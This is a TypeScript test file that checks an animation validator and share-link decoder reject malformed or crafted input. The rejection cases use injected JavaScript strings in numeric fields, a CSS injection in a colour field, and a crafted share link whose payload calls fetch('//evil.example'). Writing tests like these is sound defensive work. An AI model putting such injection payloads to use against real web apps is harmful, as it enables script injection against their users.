import { describe, it, expect } from "vitest";
import LZString from "lz-string";
import { parseAnimation } from "./validate";
import { decodeAnimation, encodeAnimation } from "./encode";
import type { Animation } from "../../store/animation";

const good: Animation = {
  version: 1, loop: true, speedMs: 150, background: "#ffffff", ink: "#111",
  frames: [{ id: "a", cp: 0x270e }, { id: "b", cp: 0x270f, color: "#000000", durationMs: 300 }],
};

describe("parseAnimation", () => {
  it("accepts a well-formed animation", () => {
    expect(parseAnimation(good)).toEqual(good);
  });
  it("drops fields it doesn't know, like the retired fontSizePx", () => {
    expect(parseAnimation({ ...good, fontSizePx: 80 })).toEqual(good);
  });
  it.each([
    ["a duration that is code", { frames: [{ id: "a", cp: 65, durationMs: "0]; alert(1); [0" }] }],
    ["a speed that is code", { speedMs: "150); alert(1" }],
    ["a code point past Unicode", { frames: [{ id: "a", cp: 0x110000 }] }],
    ["a fractional code point", { frames: [{ id: "a", cp: 65.5 }] }],
    ["a negative duration", { frames: [{ id: "a", cp: 65, durationMs: -1 }] }],
    ["a color that isn't hex", { ink: "red; background:url(x)" }],
    ["a frame that isn't an object", { frames: [null] }],
    ["more frames than the runtime plays", { frames: Array.from({ length: 65 }, (_, i) => ({ id: `f${i}`, cp: 65 })) }],
    ["another version", { version: 2 }],
  ])("rejects %s", (_, patch) => {
    expect(parseAnimation({ ...good, ...patch })).toBeNull();
  });
  it("rejects things that aren't animations", () => {
    for (const v of [null, 1, "x", []]) expect(parseAnimation(v)).toBeNull();
  });
});

describe("share links", () => {
  it("round-trip a valid animation", () => {
    expect(decodeAnimation(encodeAnimation(good))).toEqual(good);
  });
  it("reject a crafted link", () => {
    const evil = { ...good, frames: [{ id: "a", cp: 65, durationMs: "0]; fetch('//evil.example'); [0" }] };
    expect(decodeAnimation(LZString.compressToEncodedURIComponent(JSON.stringify(evil)))).toBeNull();
  });
});
